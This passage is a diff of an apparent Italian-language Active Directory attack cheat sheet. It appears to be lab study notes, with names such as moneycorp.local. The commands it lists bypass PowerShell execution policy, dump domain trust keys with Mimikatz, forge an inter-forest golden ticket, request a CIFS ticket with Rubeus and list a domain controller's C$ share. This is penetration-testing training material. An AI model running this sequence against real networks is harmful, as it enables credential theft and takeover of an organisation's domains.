@@ -742,18 +742,22 @@ ls \\mcorpdc.moneycorp.local\C$
 
 ```
 powershell -ep bypass
+
 Import-Module Invoke-Mimikatz.ps1
-- Get-DomainSID -Domain [dominio di Enterprise Admins]
 
-- Invoke-Mimikatz -Command '"lsadump::trust /patch"' (trust key)
+Get-DomainSID -Domain [dominio di Enterprise Admins]
+
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' (trust key)
 o
-- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' (trust key)
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' (trust key)
 
-- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID dominio altra foresta] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio altra foresta] /ticket:[PATH dove il ticket verrà salvato] (Inter-forest TGT viene forgiato)
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID dominio altra foresta] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio altra foresta] /ticket:[PATH dove il ticket verrà salvato] (Inter-forest TGT viene forgiato)
 
-- Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/FQDN altra foresta]  /dc: [FQDN controller di dominio di dominio di altra foresta]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
-- klist (verifico di avere il ticket TGS)
-- ls \\mcorpdc.moneycorp.local\C$
+Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/FQDN altra foresta]  /dc: [FQDN controller di dominio di dominio di altra foresta]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
+
+klist (verifico di avere il ticket TGS)
+
+ls \\mcorpdc.moneycorp.local\C$
 ```
 
 # DCShadow
